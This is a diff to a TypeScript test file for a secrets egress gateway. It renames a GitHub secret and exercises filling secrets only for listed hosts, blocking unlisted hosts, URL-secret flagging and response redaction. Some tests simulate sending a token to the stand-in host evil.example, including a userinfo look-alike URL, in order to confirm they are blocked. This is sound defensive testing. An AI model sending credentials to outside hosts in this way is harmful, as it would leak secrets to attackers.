@@ -37,7 +37,7 @@ const VALUES = [GH, OR, LOCAL, QUOTED, ORPHAN];
 
 const FILE = parseSecretsFile(`
 secrets:
-  github_write:
+  github_key:
     hosts: [api.github.com]
     grants:
       connection:github: on
@@ -73,7 +73,7 @@ interface Sent {
 async function setup(opts: { respond?: (url: string, init: RequestInit) => Response | Promise<Response> } = {}) {
   const kc = memoryKeychain();
   const secrets = new InstanceSecrets(kc, ID);
-  await secrets.set("github_write", GH);
+  await secrets.set("github_key", GH);
   await secrets.set("openrouter_key", OR);
   await secrets.set("local_bridge", LOCAL);
   await secrets.set("plain_http", "plain-http-SENTINEL-0006");
@@ -108,7 +108,7 @@ function wire(sent: Sent[]): string {
   return sent.map((s) => `${s.url}\n${JSON.stringify(s.init.headers ?? {})}\n${typeof s.init.body === "string" ? s.init.body : ""}`).join("\n---\n");
 }
 
-const bearer = { authorization: "Bearer {{ secret.github_write }}" };
+const bearer = { authorization: "Bearer {{ secret.github_key }}" };
 
 describe("the fill: filled at egress, for a listed host", () => {
   it("a granted secret is filled into a header for its listed host, and the names are reported", async () => {
@@ -118,13 +118,13 @@ describe("the fill: filled at egress, for a listed host", () => {
     expect(t.sent).toHaveLength(1);
     expect((t.sent[0]!.init.headers as Record<string, string>).authorization).toBe(`Bearer ${GH}`);
     expect(t.sent[0]!.init.redirect).toBe("manual");
-    expect(t.uses).toEqual([{ names: ["github_write"], destination: "api.github.com" }]);
+    expect(t.uses).toEqual([{ names: ["github_key"], destination: "api.github.com" }]);
   });
 
   it("fills a body for a service call, and leaves a call with no secret alone", async () => {
     const t = await setup();
     const door = t.door("connection:github", "service");
-    await door("https://api.github.com/graphql", { method: "POST", body: '{"token":"{{ secret.github_write }}"}' });
+    await door("https://api.github.com/graphql", { method: "POST", body: '{"token":"{{ secret.github_key }}"}' });
     expect(t.sent[0]!.init.body).toBe(`{"token":"${GH}"}`);
     await door("https://api.github.com/zen", {});
     expect(t.sent[1]!.init.redirect).toBeUndefined();
@@ -160,7 +160,7 @@ describe("**an unlisted host is blocked**", () => {
       const t = await setup();
       const err = await refusal(t.door("connection:github", "service")(url, { headers: bearer }));
       expect(err.code).toBe("host_not_listed");
-      expect(err.names).toEqual(["github_write"]);
+      expect(err.names).toEqual(["github_key"]);
       expect(t.sent).toHaveLength(0);
       expect(t.reads).toEqual([]);
       expect(t.uses).toEqual([]);
@@ -178,7 +178,7 @@ describe("**an unlisted host is blocked**", () => {
 
   it("a value already in the request — not a reference — is the same secret, and is blocked the same way", async () => {
     const t = await setup();
-    t.redactor.learn("github_write", GH);
+    t.redactor.learn("github_key", GH);
     const err = await refusal(t.door("connection:github", "service")("https://evil.example/", { method: "POST", headers: { "x-token": GH } }));
     expect(err.code).toBe("host_not_listed");
     expect(t.sent).toHaveLength(0);
@@ -215,9 +215,9 @@ describe("**an unlisted host is blocked**", () => {
 
 describe("a secret in a URL is flagged", () => {
   const cases: Array<[string, string, (t: Awaited<ReturnType<typeof setup>>) => void]> = [
-    ["a reference in the query", "https://api.github.com/user?access_token={{ secret.github_write }}", () => undefined],
-    ["an encoded reference", "https://api.github.com/user?t=%7B%7B%20secret.github_write%20%7D%7D", () => undefined],
-    ["a known value in the path", `https://api.github.com/u/${GH}`, (t) => t.redactor.learn("github_write", GH)],
+    ["a reference in the query", "https://api.github.com/user?access_token={{ secret.github_key }}", () => undefined],
+    ["an encoded reference", "https://api.github.com/user?t=%7B%7B%20secret.github_key%20%7D%7D", () => undefined],
+    ["a known value in the path", `https://api.github.com/u/${GH}`, (t) => t.redactor.learn("github_key", GH)],
     ["a known value, URL-encoded", `https://api.github.com/?q=${encodeURIComponent(QUOTED)}`, (t) => t.redactor.learn("quoted", QUOTED)],
     ["userinfo", "https://user:pass@api.github.com/", () => undefined],
     ["the userinfo look-alike", "https://api.github.com@evil.example/", () => undefined],
@@ -267,9 +267,9 @@ describe("**a model body never contains a value**", () => {
     const text = await res.text();
     expect(text).not.toContain(GH);
     expect(text).not.toContain(JSON.stringify(QUOTED).slice(1, -1));
-    expect(text).toContain(redactedSecret("github_write"));
+    expect(text).toContain(redactedSecret("github_key"));
     expect(text).toContain(redactedSecret("quoted"));
-    expect(res.headers.get("x-echo")).toBe(`Bearer ${redactedSecret("github_write")}`);
+    expect(res.headers.get("x-echo")).toBe(`Bearer ${redactedSecret("github_key")}`);
 
     // … and that text becomes the model's context
     await t.door("agent:assistant", "model")(model, { method: "POST", headers: providerKey, body: chat(`the tool said: ${text}`) });
@@ -328,7 +328,7 @@ describe("who may use it", () => {
     const err = await refusal(t.door("agent:devin", "service")("https://api.github.com/", { headers: bearer }));
     expect(err.code).toBe("needs_approval");
     expect(t.sent).toHaveLength(0);
-    await t.door("agent:devin", "service", { approved: ["github_write"] })("https://api.github.com/", { headers: bearer });
+    await t.door("agent:devin", "service", { approved: ["github_key"] })("https://api.github.com/", { headers: bearer });
     expect(t.sent).toHaveLength(1);
   });
 
@@ -383,7 +383,7 @@ describe("redacted on the way back", () => {
     });
     const res = await t.door("connection:github", "service")("https://api.github.com/stream", { headers: bearer });
     const text = await res.text();
-    expect(text).toBe(`data: {"t":"${redactedSecret("github_write")}"}\n\n`);
+    expect(text).toBe(`data: {"t":"${redactedSecret("github_key")}"}\n\n`);
     expect(res.headers.get("content-length")).toBeNull();
   });
 
@@ -405,10 +405,10 @@ describe("redacted on the way back", () => {
     );
     const err = (await door("https://api.github.com/", { headers: bearer }).catch((e: unknown) => e)) as Error;
     expect(err.message).not.toContain(GH);
-    expect(err.message).toContain(redactedSecret("github_write"));
+    expect(err.message).toContain(redactedSecret("github_key"));
     expect(err.cause).toBeUndefined();
     // the value WAS on the wire, so the use is recorded
-    expect(t.uses).toEqual([{ names: ["github_write"], destination: "api.github.com" }]);
+    expect(t.uses).toEqual([{ names: ["github_key"], destination: "api.github.com" }]);
   });
 
   it("a null-body status passes through", async () => {
@@ -423,7 +423,7 @@ describe("planEgress — the checks, without the store", () => {
     const t = await setup();
     const plan = planEgress({ url: "https://api.github.com/user", headers: bearer }, { secrets: FILE, grantee: "connection:github", purpose: "service", redactor: t.redactor });
     expect(plan.destination.entry).toBe("api.github.com");
-    expect(plan.names).toEqual(["github_write"]);
+    expect(plan.names).toEqual(["github_key"]);
     expect(t.reads).toEqual([]);
   });
 
@@ -441,10 +441,10 @@ describe("recordSecretUse — *last used* is stamped on the run", () => {
   it("merges the names into runs.meta.secrets as a set, and does nothing for none", async () => {
     const calls: Array<{ text: string; values: unknown[] }> = [];
     const db: RunExecutor = { query: async (text, values) => (calls.push({ text, values }), { rows: [] }) };
-    await recordSecretUse(db, 42, ["github_write"]);
+    await recordSecretUse(db, 42, ["github_key"]);
     await recordSecretUse(db, 42, []);
     expect(calls).toHaveLength(1);
-    expect(calls[0]!.values).toEqual([42, JSON.stringify(["github_write"]), SECRET_USE_META_KEY]);
+    expect(calls[0]!.values).toEqual([42, JSON.stringify(["github_key"]), SECRET_USE_META_KEY]);
     expect(calls[0]!.text).toMatch(/UPDATE runs SET meta = jsonb_set/);
   });
 });
